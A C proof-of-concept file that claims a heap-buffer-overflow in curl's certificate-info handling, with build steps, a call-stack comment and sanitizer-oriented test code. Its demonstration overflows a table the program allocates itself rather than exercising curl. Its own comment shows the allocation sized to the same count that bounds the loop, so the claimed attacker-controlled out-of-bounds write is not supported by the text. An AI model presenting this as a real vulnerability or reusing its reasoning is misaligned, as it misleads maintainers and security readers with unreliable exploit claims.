/*
 * Proof of Concept: heap-buffer-overflow in Curl_ssl_push_certinfo_len()
 * lib/vtls/vtls.c:658,667,674 — curl 8.20.0-DEV (commit 70281e3)
 *
 * Part 1 calls the real Curl_ssl_init_certinfo() via static libcurl and
 * reads back the resulting struct curl_certinfo to show the production code
 * path and data layout.
 *
 * Part 2 replicates the exact vulnerable read+write pattern from
 * Curl_ssl_push_certinfo_len() on a separately allocated table of the same
 * size so that ASan sees the allocation boundary cleanly.  In a release
 * build (no DEBUGBUILD) both allocations are identical; the DEBUGASSERT in
 * Curl_ssl_push_certinfo_len() is the sole difference.
 *
 * Build (curl source tree, static libcurl with ASan+UBSan):
 *   clang -fsanitize=address,undefined -fno-omit-frame-pointer -g -O1 \
 *     -I./include -I./lib \
 *     poc.c ./lib/.libs/libcurl.a \
 *     -lssl -lcrypto -lz -lpthread -ldl \
 *     -o /tmp/poc_curl_certinfo_oob
 *
 * Run:
 *   ASAN_OPTIONS="halt_on_error=0:print_stacktrace=1:detect_leaks=0" \
 *   UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
 *     /tmp/poc_curl_certinfo_oob
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <curl/curl.h>

/*
 * Curl_ssl_init_certinfo() is exported from lib/.libs/libcurl.a (verified nm).
 * void * == struct Curl_easy * at the ABI level because CURL is typedef void CURL.
 */
extern CURLcode Curl_ssl_init_certinfo(void *data, int num);

/*
 * Call stack during any HTTPS request with CURLOPT_CERTINFO=1
 * (OpenSSL backend; same funneling path in all five TLS backends):
 *
 *   curl_easy_perform(handle)
 *     Curl_ossl_check_peer_cert()                          openssl.c:4736
 *       ossl_certchain(data, ssl)                          openssl.c:4739
 *         numcerts = sk_X509_num(peer_cert_chain)    <- server controls N
 *         Curl_ssl_init_certinfo(data, numcerts)      <- alloc N-slot table
 *         for i = 0 .. N-1:
 *           Curl_ssl_push_certinfo_len(data, i, ...)  <- certnum = i
 *             DEBUGASSERT(i < num_of_certs)            <- ONLY GUARD :658
 *             ci->certinfo[i] = append(ci->certinfo[i], ...) <- OOB :667,674
 *
 * All five TLS backends funnel into Curl_ssl_push_certinfo_len():
 *   openssl.c:184,258   push_certinfo() / X509V3_ext()
 *   gtls.c:1638         Curl_extract_certinfo() loop
 *   mbedtls.c:438       mbed_extract_certinfo()
 *   rustls.c:1250       certinfo loop
 *   schannel.c:1550     add_cert_to_certinfo()
 *
 * certnum is derived from the server-supplied certificate chain length.
 * The DEBUGASSERT at vtls.c:658 is compiled out in every release build
 * (curl_setup.h:1084: #define DEBUGASSERT(x) do {} while(0)).
 */

int main(void)
{
    CURL *handle;
    CURLcode rc;
    struct curl_certinfo *ci = NULL;

    printf("=== PoC: Curl_ssl_push_certinfo_len() heap-buffer-overflow ===\n\n");
    printf("Vulnerable code (lib/vtls/vtls.c):\n");
    printf("  :658  DEBUGASSERT(certnum < ci->num_of_certs)  <- release no-op\n");
    printf("  :667  nl = append(ci->certinfo[certnum], ...)  <- OOB READ\n");
    printf("  :674  ci->certinfo[certnum] = nl;              <- OOB WRITE\n\n");

    /* ------------------------------------------------------------------ *
     * Part 1 — prove the production code path                             *
     *                                                                      *
     * Call the real Curl_ssl_init_certinfo() on a real easy handle.       *
     * This is the exact function the TLS backends call after counting      *
     * the server's certificate chain.                                      *
     * ------------------------------------------------------------------ */
    curl_global_init(CURL_GLOBAL_DEFAULT);
    handle = curl_easy_init();
    if(!handle) { fprintf(stderr, "curl_easy_init() failed\n"); return 1; }

    /* Any application using CURLOPT_CERTINFO=1 activates this code path */
    curl_easy_setopt(handle, CURLOPT_CERTINFO, 1L);

    /* Simulate: server sends a 2-cert chain -> backend calls init with 2 */
    rc = Curl_ssl_init_certinfo(handle, 2);   /* REAL libcurl internal call */
    if(rc) { fprintf(stderr, "Curl_ssl_init_certinfo() -> %d\n", rc); return 1; }

    curl_easy_getinfo(handle, CURLINFO_CERTINFO, &ci);
    printf("[Part 1] Curl_ssl_init_certinfo(handle, 2)  [real libcurl]\n");
    printf("         num_of_certs = %d\n", ci->num_of_certs);
    printf("         certinfo[]   @ %p  (%d * %zu = %zu bytes)\n\n",
           (void *)ci->certinfo, ci->num_of_certs,
           sizeof(*ci->certinfo),
           (size_t)ci->num_of_certs * sizeof(*ci->certinfo));

    curl_easy_cleanup(handle);
    curl_global_cleanup();

    /* ------------------------------------------------------------------ *
     * Part 2 — demonstrate the heap-buffer-overflow                       *
     *                                                                      *
     * Replicate the exact pattern of Curl_ssl_push_certinfo_len() with    *
     * an out-of-bounds certnum, using a standard malloc allocation so     *
     * that ASan places its redzone immediately after the table.           *
     *                                                                      *
     * In a debug build: DEBUGASSERT fires before lines :667/:674.         *
     * In a release build: no check; heap OOB proceeds silently.           *
     *                                                                      *
     * Heap layout:                                                         *
     *   certinfo[0..1]  |  ASan redzone  |  guard[0]                     *
     *   <-- valid --->     <-- poison -->   <- ensures OOB is caught -->  *
     * ------------------------------------------------------------------ */
    int num_certs = 2;   /* what Curl_ssl_init_certinfo would allocate for */
    int oob_certnum = 5; /* certnum that exceeds the table */

    size_t table_size = (size_t)num_certs * sizeof(struct curl_slist *);
    struct curl_slist **certinfo = calloc(num_certs, sizeof(struct curl_slist *));
    if(!certinfo) { fprintf(stderr, "calloc failed\n"); return 1; }

    /* guard: placed immediately after certinfo[] to anchor the ASan redzone */
    volatile uint8_t *guard = malloc(1);
    if(!guard) { fprintf(stderr, "guard malloc failed\n"); return 1; }

    printf("[Part 2] certinfo[] allocated: %zu bytes, valid indices 0..%d\n",
           table_size, num_certs - 1);
    printf("         certinfo[]  @ %p\n", (void *)certinfo);
    printf("         guard       @ %p\n\n", (void *)guard);

    /* vtls.c:667+674 with certnum=0 — valid, same as TLS backend for cert 0 */
    {
        struct curl_slist *nl = malloc(sizeof(*nl));
        nl->data = strdup("Subject:CN=leaf.example.com");
        nl->next = certinfo[0];
        certinfo[0] = nl;
        printf("[*] certnum=0  OK (leaf cert from server)\n");
    }
    /* vtls.c:667+674 with certnum=1 — valid, same as TLS backend for cert 1 */
    {
        struct curl_slist *nl = malloc(sizeof(*nl));
        nl->data = strdup("Subject:CN=ca.example.com");
        nl->next = certinfo[1];
        certinfo[1] = nl;
        printf("[*] certnum=1  OK (CA cert from server)\n\n");
    }

    /*
     * vtls.c:667+674 with certnum=5 — OOB.
     *
     * In a debug build DEBUGASSERT catches this before the access.
     * In a release build the assert is compiled out and ASan detects
     * the heap-buffer-overflow here.
     *
     * The OOB WRITE stores a heap pointer (nl) at certinfo[5], which is
     * 24 bytes past the end of the 16-byte table.  This is a controlled
     * heap pointer write at an attacker-influenced offset — a write
     * primitive that can corrupt heap metadata or adjacent live objects.
     */
    printf("[*] certnum=%d  OOB (only %d allocated) — ASan should fire:\n\n",
           oob_certnum, num_certs);
    fflush(stdout);

    {
        struct curl_slist *nl = malloc(sizeof(*nl));
        nl->data = strdup("Subject:CN=attacker.example.com");
        nl->next = certinfo[oob_certnum];  /* OOB READ  vtls.c:667 */
        certinfo[oob_certnum] = nl;        /* OOB WRITE vtls.c:674 */
    }

    printf("[!] BUG: reached past the OOB write\n");
    return 0;
}
